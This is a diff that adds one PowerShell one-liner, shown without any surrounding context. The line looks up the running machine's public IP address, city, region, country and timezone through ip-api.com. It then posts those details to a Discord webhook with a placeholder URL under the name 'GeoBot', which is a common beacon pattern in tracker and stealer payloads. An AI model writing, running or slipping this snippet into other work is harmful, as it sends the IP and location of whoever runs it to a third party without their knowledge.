@@ -1,1 +1,1 @@
-
+$webhook = 'https://discord.com/api/webhooks/your_webhook_url'; $geo = Invoke-RestMethod -Uri 'http://ip-api.com/json'; $msg = @{username='GeoBot';content="📍 Location: $($geo.city), $($geo.regionName), $($geo.country) 🌐 IP: $($geo.query) 🕒 Timezone: $($geo.timezone)"}; Invoke-RestMethod -Uri $webhook -Method Post -Body ($msg | ConvertTo-Json -Depth 3) -ContentType 'application/json'
